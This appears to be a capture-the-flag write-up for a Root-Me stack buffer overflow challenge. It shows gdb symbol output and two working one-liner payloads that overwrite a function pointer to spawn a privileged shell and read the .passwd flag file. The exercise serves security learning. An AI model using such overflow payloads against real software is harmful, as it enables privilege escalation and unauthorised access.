// Link to the challenge: https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-2?action_solution=voir&debut_affiche_solutions=1#pagination_affiche_solutions
// For this challenge, we need to run the "shell()" function in order to run the "bin/bash" command with privileged permission to be able to read the ".passwd" file. 
// In the "main" function, "func" is pointer to function, and it is a local variable, so it is stored in stack.
// We need to make "func" pointe to "shell" function instead of "sup()".
// To make it, we can overflow the buffer by inputing more than 128 character from "fgets" function.

// Run "gdb" and "info function" to see the address of the "shell" function:
$ gdb ./ch15
 ...
 (gdb) info function
// ==> we have:   
Non-debugging symbols:
0x08048350  _init
0x08048390  fgets@plt
0x080483a0  geteuid@plt
0x080483b0  puts@plt
0x080483c0  system@plt
0x080483d0  setreuid@plt
0x080483e0  __libc_start_main@plt
0x080483f0  __gmon_start__@plt
0x08048400  _start
0x08048440  _dl_relocate_static_pie
0x08048450  __x86.get_pc_thunk.bx
0x08048460  deregister_tm_clones
0x080484a0  register_tm_clones
0x080484e0  __do_global_dtors_aux
0x08048510  frame_dummy
0x08048516  shell // This is what we want
0x08048559  sup
0x08048584  main
0x080485de  __x86.get_pc_thunk.ax
0x080485f0  __libc_csu_init
0x08048650  __libc_csu_fini
0x08048654  _fini

// Then we overflow to run the "shell" function:
$ cat <(python -c "print 'a'*128 + '\x16\x85\x04\x08'") - | ./ch15
  cat .passwd 
// OR
$cat <(for i in {0..127}; do printf "a"; done; printf "\x16\x85\x04\x08") - |./ch15
  cat .passwd
// ==> we got the flag
